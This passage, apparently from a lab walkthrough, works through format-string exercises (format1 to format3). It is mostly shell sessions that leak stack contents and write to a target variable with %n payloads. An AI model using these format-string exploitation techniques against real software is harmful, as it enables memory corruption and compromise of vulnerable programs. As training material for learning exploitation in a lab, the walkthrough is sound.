<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> i=0; </span><span style="color:#b48ead;">while </span><span style="color:#96b5b4;">[ </span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">i -le</span><span style="color:#c0c5ce;"> 200 </span><span style="color:#96b5b4;">]</span><span style="color:#c0c5ce;">; </span><span style="color:#b48ead;">do </span><span style="color:#bf616a;">./format1 </span><span style="color:#c0c5ce;">`</span><span style="color:#bf616a;">python -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;aaaa%%%03d</span><span style="color:#96b5b4;">\\\$</span><span style="color:#a3be8c;">08x.&#39; % </span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">&quot;` ; </span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">=$</span><span style="color:#a3be8c;">((i</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">1</span><span style="color:#a3be8c;">))</span><span style="color:#c0c5ce;">; </span><span style="color:#b48ead;">done</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaa</span><span style="color:#c0c5ce;">%</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">08x.aaaa0804960c.aaaabffffcc8.aaaa08048469.aaaab7fd8304.aaaab7fd7ff4.aaaabffffcc8.aaaa08048435.aaaabffffe98.aaaab7ff1040.aaaa0804845b.aaaab7fd7ff4.aaaa08048450.aaaa00000000.aaaabffffd48.aaaab7eadc76.aaaa00000002.aaaabffffd74.aaaabffffd80.aaaab7fe1848.aaaabffffd30.aaaaffffffff.aaaab7ffeff4.aaaa0804824d.aaaa00000001.aaaabffffd30.aaaab7ff0626.aaaab7fffab0.aaaab7fe1b28.aaaab7fd7ff4.aaaa00000000.aaaa00000000.aaaabffffd48.aaaa4e55cc8b.aaaa9d54d149.aaaa00000000.aaaa00000000.aaaa00000000.aaaa00000002.aaaa08048340.aaaa00000000.aaaab7ff6210.aaaab7eadb9b.aaaab7ffeff4.aaaa00000002.aaaa08048340.aaaa00000000.aaaa08048361.aaaa0804841c.aaaa00000002.aaaabffffd74.aaaa08048450.aaaa08048440.aaaab7ff1040.aaaabffffd6c.aaaab7fff8f8.aaaa00000002.aaaabffffe8e.aaaabffffe98.aaaa00000000.aaaabffffea6.aaaabffffec7.aaaabffffed1.aaaabffffee5.aaaabffffef7.aaaabfffff07.aaaabfffff1a.aaaabfffff27.aaaabfffff32.aaaabfffff70.aaaabfffff87.aaaabfffff98.aaaabfffffa6.aaaabfffffbd.aaaa00000000.aaaa00000020.aaaab7fe2414.aaaa00000021.aaaab7fe2000.aaaa00000010.aaaa0f8bfbff.aaaa00000006.aaaa00001000.aaaa00000011.aaaa00000064.aaaa00000003.aaaa08048034.aaaa00000004.aaaa00000020.aaaa00000005.aaaa00000007.aaaa00000007.aaaab7fe3000.aaaa00000008.aaaa00000000.aaaa00000009.aaaa08048340.aaaa0000000b.aaaa000003e9.aaaa0000000c.aaaa00000000.aaaa0000000d.aaaa000003e9.aaaa0000000e.aaaa000003e9.aaaa00000017.aaaa00000001.aaaa00000019.aaaabffffe6b.aaaa0000001f.aaaabffffff2.aaaa0000000f.aaaabffffe7b.aaaa00000000.aaaa00000000.aaaa00000000.aaaa00000000.aaaa00000000.aaaa8c000000.aaaa4f4034dd.aaaaa130a824.aaaa613016f9.aaaa696337b9.aaaa00363836.aaaa00000000.aaaa00000000.aaaa00000000.aaaa2f2e0000.aaaa6d726f66.aaaa00317461.aaaa61616161.aaaa31333125.aaaa78383024.aaaa5353002e.aaaa4c435f48.aaaa544e4549.aaaa3239313d.aaaa3836312e.aaaa3631312e.aaaa3220312e.aaaa20383335.aaaa55003232.aaaa3d524553.aaaa72657375.aaaa49414d00.aaaa762f3d4c.aaaa6d2f7261.aaaa2f6c6961.aaaa72657375.aaaa444c4f00.aaaa3d445750.aaaa6d6f682f.aaaa73752f65.aaaa48007265.aaaa3d454d4f.aaaa6d6f682f.aaaa73752f65.aaaa53007265.aaaa545f4853.aaaa2f3d5954.aaaa2f766564.aaaa2f737470.aaaa4f4c0030.aaaa4d414e47.aaaa73753d45.aaaa54007265.aaaa3d4d5245.aaaa72657478.aaaa4150006d.aaaa2f3d4854.aaaa2f727375.aaaa61636f6c.aaaa69622f6c.aaaa752f3a6e.aaaa622f7273.aaaa2f3a6e69.aaaa3a6e6962.aaaa7273752f.aaaa636f6c2f.aaaa672f6c61.aaaa73656d61.aaaa73752f3a.aaaa61672f72.aaaa0073656d.aaaa50534944.aaaa3d59414c.aaaa61636f6c.aaaa736f686c.aaaa30313a74.aaaa4c00302e.aaaa3d474e41.aaaa555f6e65.aaaa54552e53.aaaa00382d46.aaaa4c454853.aaaa622f3d4c.aaaa732f6e69.aaaa57500068.aaaa6f2f3d44.aaaa702f7470.aaaa6f746f72.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> ./format1 `</span><span style="color:#bf616a;">python -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;\x38\x96\x04\x08%130</span><span style="color:#96b5b4;">\\\$</span><span style="color:#a3be8c;">08n.&#39;</span><span style="color:#c0c5ce;">&quot;`</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">8.you</span><span style="color:#c0c5ce;"> have modified the target :)</span><span style="color:#c0c5ce;">
</span></code></pre><h1 id="format-2">Format 2</h1>
<pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> objdump</span><span style="color:#bf616a;"> -t</span><span style="color:#c0c5ce;"> format2 | </span><span style="color:#bf616a;">grep</span><span style="color:#c0c5ce;"> target</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">080496e4</span><span style="color:#c0c5ce;"> g     O .bss   00000004              target</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> i=0; </span><span style="color:#b48ead;">while </span><span style="color:#96b5b4;">[ </span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">i -le</span><span style="color:#c0c5ce;"> 10 </span><span style="color:#96b5b4;">]</span><span style="color:#c0c5ce;">; </span><span style="color:#b48ead;">do </span><span style="color:#bf616a;">python -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;aaaa%%%03d</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08x.&#39; % </span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">&quot; | </span><span style="color:#bf616a;">./format2 </span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">=$</span><span style="color:#a3be8c;">((i</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">1</span><span style="color:#a3be8c;">))</span><span style="color:#c0c5ce;">; </span><span style="color:#b48ead;">done</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaa</span><span style="color:#c0c5ce;">%</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">08x.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 0 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaa00000200.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 0 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaab7fd8420.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 0 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaabffffb14.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 0 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaa61616161.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 0 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaa35303025.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 0 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaa78383024.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 0 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaa00000a2e.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 0 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaab7fff524.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 0 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaabffffb70.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 0 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaab7fe35c9.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 0 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;\xe4\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%004</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08x.&#39;</span><span style="color:#c0c5ce;">&quot; | </span><span style="color:#bf616a;">./format2</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496e4.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 0 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;\xe4\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%004</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08n.&#39;</span><span style="color:#c0c5ce;">&quot; | </span><span style="color:#bf616a;">./format2</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">you</span><span style="color:#c0c5ce;"> have modified the target :)</span><span style="color:#c0c5ce;">
</span></code></pre><h1 id="format-3">Format 3</h1>
<pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> objdump</span><span style="color:#bf616a;"> -t</span><span style="color:#c0c5ce;"> format3 | </span><span style="color:#bf616a;">grep</span><span style="color:#c0c5ce;"> target</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">080496f4</span><span style="color:#c0c5ce;"> g     O .bss   00000004              target</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> i=0; </span><span style="color:#b48ead;">while </span><span style="color:#96b5b4;">[ </span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">i -le</span><span style="color:#c0c5ce;"> 20 </span><span style="color:#96b5b4;">]</span><span style="color:#c0c5ce;">; </span><span style="color:#b48ead;">do </span><span style="color:#bf616a;">python -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;aaaa%%%03d</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08x.&#39; % </span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">&quot; | </span><span style="color:#bf616a;">./format3 </span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">=$</span><span style="color:#a3be8c;">((i</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">1</span><span style="color:#a3be8c;">))</span><span style="color:#c0c5ce;">; </span><span style="color:#b48ead;">done</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaa</span><span style="color:#c0c5ce;">%</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">08x.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 00000000 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaa00000000.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 00000000 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaabffffad0.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 00000000 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaab7fd7ff4.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 00000000 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaa00000000.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 00000000 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaa00000000.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 00000000 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaabffffcd8.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 00000000 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaa0804849d.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 00000000 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaabffffad0.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 00000000 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaa00000200.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 00000000 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaab7fd8420.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 00000000 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaabffffb14.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 00000000 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaa61616161.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 00000000 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaa33313025.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 00000000 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaa78383024.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 00000000 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaa00000a2e.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 00000000 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaab7fff524.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 00000000 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaabffffb70.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 00000000 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaab7fe35c9.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 00000000 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaa00000007.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 00000000 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaa00000010.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 00000000 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;\xf4\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08x.&#39;</span><span style="color:#c0c5ce;">&quot; | </span><span style="color:#bf616a;">./format3</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f4.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 00000000 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;a%13</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08n\xf3\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08x.&#39;</span><span style="color:#c0c5ce;">&quot; | </span><span style="color:#bf616a;">./format3</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">Segmentation</span><span style="color:#c0c5ce;"> fault</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;a%13</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08x\xf3\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08x.&#39;</span><span style="color:#c0c5ce;">&quot; | </span><span style="color:#bf616a;">./format3</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">a78383024aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa33312561.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 00000000 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;a%14</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08x\xf3\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08x.&#39;</span><span style="color:#c0c5ce;">&quot; | </span><span style="color:#bf616a;">./format3</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">a080496f3aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa34312561.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 00000000 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;a%14</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08n\xf3\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08x.&#39;</span><span style="color:#c0c5ce;">&quot; | </span><span style="color:#bf616a;">./format3</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa34312561.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 00000000 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;a%14</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08n\xf5\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08x.&#39;</span><span style="color:#c0c5ce;">&quot; | </span><span style="color:#bf616a;">./format3</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa34312561.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 00000100 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;a%16</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08na%17</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08n\xf7\x96\x04\x08\xf8\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08x.&#39;</span><span style="color:#c0c5ce;">&quot; | </span><span style="color:#bf616a;">./format3</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa36312561.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 01000000 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;a%16</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08na%17</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08n\xf7\x96\x04\x06\xf8\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08x.&#39;</span><span style="color:#c0c5ce;">&quot; | </span><span style="color:#bf616a;">./format3</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">Segmentation</span><span style="color:#c0c5ce;"> fault</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;a%16</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08na%17</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08n\xf7\x96\x04\x08\xf6\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08x.&#39;</span><span style="color:#c0c5ce;">&quot; | </span><span style="color:#bf616a;">./format3</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa36312561.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 00020000 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08&#39;+&#39;a&#39;*(0x44-12)+&#39;%12</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08x.&#39;+&#39;a&#39;*(0x55-0x44)+&#39;%13</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08x.&#39;+&#39;a&#39;*(0x102-0x55)+&#39;%14</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08x.&#39;</span><span style="color:#c0c5ce;">&quot; | </span><span style="color:#bf616a;">./format3</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f4.aaaaaaaaaaaaaaaaa080496f5.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f6.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;"> is 00000000 :(</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08&#39;+&#39;a&#39;*(0x44-12)+&#39;%12</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08x&#39;+&#39;a&#39;*(0x55-0x44)+&#39;%13</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08x&#39;+&#39;a&#39;*(0x102-0x55)+&#39;%14</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08x&#39;</span><span style="color:#c0c5ce;">&quot; | </span><span style="color:#bf616a;">./format3</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f4aaaaaaaaaaaaaaaaa080496f5aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f6</span><span style="color:#c0c5ce;">
</span></code></pre><h2 id="solution-0-brute">solution 0: Brute!</h2>
<pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;\xf4\x96\x04\x08&#39;+&#39;%016930112d&#39;+&#39;%12</span><span style="color:#96b5b4;">\$</span><span style="color:#a3be8c;">08n&#39;</span><span style="color:#c0c5ce;">&quot; | </span><span style="color:#bf616a;">./format3</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000...</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;"># 反正这里有很多很多很多零，我就好心删了它们</span><span style="color:#65737e;">
</span><span style="color:#bf616a;">...0000000000000</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">you</span><span style="color:#c0c5ce;"> have modified the target :)</span><span style="color:#c0c5ce;">
